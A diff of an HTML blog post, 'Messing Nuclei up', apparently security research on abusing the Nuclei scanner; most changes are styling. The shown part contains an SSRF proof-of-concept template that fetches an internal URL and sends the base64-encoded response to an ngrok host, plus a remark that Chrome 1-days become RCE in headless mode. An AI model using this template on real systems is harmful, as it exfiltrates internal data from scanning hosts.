@@ -1,54 +1,67 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Messing Nuclei up</title>
 <style>
 
+		@import url("/assets/enhancements.css");
 		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
 		html {
-			background: url('/4rt3/g3n3r4t1v3/sketch_5p4c3/out1.gif') no-repeat center/100% fixed;
+			background: #050711;
 		}
 		body {
-			font-family: 'gohu', monospace;
-			max-width: 50em;
+			font-family: var(--body-font);
+			max-width: var(--content-width);
+			font-size: var(--body-size);
+			padding: 1rem;
+			box-sizing: border-box;
 			margin: 0 auto;
-			color: white;
-			background-color: rgb(0,0,0,0.7);
-			line-height: calc(1ex / 0.32);
+			color: var(--text-color);
+			background-color: rgba(0,0,0,var(--content-opacity));
+			line-height: var(--body-leading);
 			margin-top: 3em;
 			overflow-wrap: break-word;
 		}
 		pre {
-			font-family: 'gohu', monospace;
-			white-space: pre-wrap;
-			overflow-wrap: anywhere;
-			line-height: 125%;
+			font-family: var(--body-font);
+			white-space: pre;
+			overflow-x: auto;
+			max-width: 100%;
+			box-sizing: border-box;
+			overflow-wrap: normal;
+			line-height: 1.5;
       		background-color: #111;
     	  	padding: 1em;
 		}
 		@media only screen and (max-width:768px) {
 			body {
-				max-width:100%;
+				max-width:calc(100% - 1rem);
+				margin-top: 1rem;
+				font-size: max(14px, calc(var(--body-size) - 2px));
 			}
 		}
 		td {
 			vertical-align: top;
 		}
 		.index td {
-			padding: 0.15em 0.4em;
+			padding: 0.35em 0.4em;
 		}
 		.index tr:nth-child(odd) {
-			background-color: rgba(0,0,0,0.55);
+			background-color: rgba(14,19,34,0.4);
 		}
 		.index tr:nth-child(even) {
-			background-color: rgba(255,255,255,0.12);
+			background-color: rgba(var(--stripe-rgb),0.18);
 		}
 		.index tr:first-child {
 			background-color: transparent;
 		}
 		a:link {
-			color: #0a0 ;
+			color: var(--link-color);
 		}
 		a:visited {
-			color: #004100 ;
+			color: var(--visited-color);
 		}
 		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
 		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
@@ -94,8 +107,6 @@
 		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
 	
 </style>
-<head>
-  <meta charset="UTF-8">
 </head>
 
 <body><h1>Messing Nuclei up</h1>
@@ -122,26 +133,26 @@
 </code></pre></div>
 
 <h2>SSRF</h2>
-<div class="codehilite"><pre><span></span><code><span class="nx">id</span><span class="p">:</span><span class="w"> </span><span class="nx">ssrf</span><span class="o">-</span><span class="nx">poc</span>
+<div class="codehilite"><pre><span></span><code><span class="n">id</span><span class="o">:</span><span class="w"> </span><span class="n">ssrf</span><span class="o">-</span><span class="n">poc</span>
 
-<span class="nx">info</span><span class="p">:</span>
-<span class="w">  </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">SSRF</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">Nuclei</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">Exfiltration</span>
-<span class="w">  </span><span class="nx">author</span><span class="p">:</span><span class="w"> </span><span class="nx">caioluders</span>
-<span class="w">  </span><span class="nx">severity</span><span class="p">:</span><span class="w"> </span><span class="nx">critical</span>
-<span class="w">  </span><span class="nx">description</span><span class="p">:</span><span class="w"> </span><span class="nx">Makes</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">dumps</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">attacker</span><span class="err">&#39;</span><span class="nx">s</span><span class="w"> </span><span class="nx">server</span>
+<span class="n">info</span><span class="o">:</span>
+<span class="w">  </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">SSRF</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Nuclei</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">Exfiltration</span>
+<span class="w">  </span><span class="n">author</span><span class="o">:</span><span class="w"> </span><span class="n">caioluders</span>
+<span class="w">  </span><span class="n">severity</span><span class="o">:</span><span class="w"> </span><span class="n">critical</span>
+<span class="w">  </span><span class="n">description</span><span class="o">:</span><span class="w"> </span><span class="n">Makes</span><span class="w"> </span><span class="kd">internal</span><span class="w"> </span><span class="n">request</span><span class="o">,</span><span class="w"> </span><span class="n">dumps</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">attacker</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">server</span>
 
-<span class="nx">requests</span><span class="p">:</span>
-<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">method</span><span class="p">:</span><span class="w"> </span><span class="nx">GET</span>
-<span class="w">    </span><span class="nx">path</span><span class="p">:</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;http://127.0.0.1:1337/flag&quot;</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;http://133713371337.ngrok.io/{{base64(output)}}&quot;</span>
-<span class="w">    </span><span class="nx">extractors</span><span class="p">:</span>
-<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="k">type</span><span class="p">:</span><span class="w"> </span><span class="nx">regex</span>
-<span class="w">        </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">output</span>
-<span class="w">        </span><span class="nx">part</span><span class="p">:</span><span class="w"> </span><span class="nx">body</span>
-<span class="w">        </span><span class="nx">internal</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">        </span><span class="nx">regex</span><span class="p">:</span>
-<span class="w">          </span><span class="o">-</span><span class="w"> </span><span class="s">&quot;.*&quot;</span>
+<span class="n">requests</span><span class="o">:</span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">method</span><span class="o">:</span><span class="w"> </span><span class="n">GET</span>
+<span class="w">    </span><span class="n">path</span><span class="o">:</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;http://127.0.0.1:1337/flag&quot;</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;http://133713371337.ngrok.io/{{base64(output)}}&quot;</span>
+<span class="w">    </span><span class="n">extractors</span><span class="o">:</span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">type</span><span class="o">:</span><span class="w"> </span><span class="n">regex</span>
+<span class="w">        </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">output</span>
+<span class="w">        </span><span class="n">part</span><span class="o">:</span><span class="w"> </span><span class="n">body</span>
+<span class="w">        </span><span class="kd">internal</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">        </span><span class="n">regex</span><span class="o">:</span>
+<span class="w">          </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;.*&quot;</span>
 </code></pre></div>
 
 <p>Is this a SERVER SIDE, or Client Side? Hacker Side? The question remains...</p>
@@ -770,4 +781,5 @@
 
 <p><a href="https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46">https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46</a></p>
 <p>So every 1day on chrome will become a RCE on Nuclei. Dont ever run <code>-headless</code> I guess.</p>
-<p>( ´ ▽ ` )/</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>
+<p>( ´ ▽ ` )/</p><hr><footer class="site-byline">by <a href='https://twitter.com/caioluders'>@caioluders</a></footer><script defer src="/assets/enhancements.js"></script>
+</body></html>
